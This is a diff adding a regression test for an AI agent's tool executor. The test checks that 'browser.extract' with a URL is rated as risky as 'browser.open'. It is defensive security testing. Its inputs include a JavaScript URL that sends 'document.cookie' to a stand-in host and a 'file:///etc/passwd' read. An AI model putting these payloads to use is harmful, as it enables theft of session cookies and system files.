@@ -188,3 +188,18 @@ def test_only_http_urls(agent_project: Path, make_app) -> None:
     executor, _, _ = _executor(make_app, agent_project)
     result = executor.run("api.request", {"url": "file:///etc/passwd"})
     assert not result.ok and "http" in result.error
+
+
+def test_extracting_from_a_url_is_classified_like_opening_it(agent_project: Path, executor_for) -> None:
+    """Regression (security audit): ``browser.extract`` with ``url`` navigates, but was rated as a
+    plain read with no target — the privileged-scheme and sensitive-URL rules of ``browser.open``
+    never saw the URL."""
+    executor, _ = executor_for(agent_project)
+    for url in ("file:///etc/passwd", "javascript:fetch('//evil.test/'+document.cookie)"):
+        opened = executor.plan("browser.open", {"url": url})
+        extracted = executor.plan("browser.extract", {"url": url})
+        assert extracted.decision.risk >= opened.decision.risk >= Risk.HIGH, (url, extracted.decision.risk, opened.decision.risk)
+    plain = executor.plan("browser.extract", {})
+    assert plain.decision.risk == Risk.SAFE  # reading the page already shown stays a read
+    https = executor.plan("browser.extract", {"url": "https://example.com/report"})
+    assert https.decision.risk == executor.plan("browser.open", {"url": "https://example.com/report"}).decision.risk
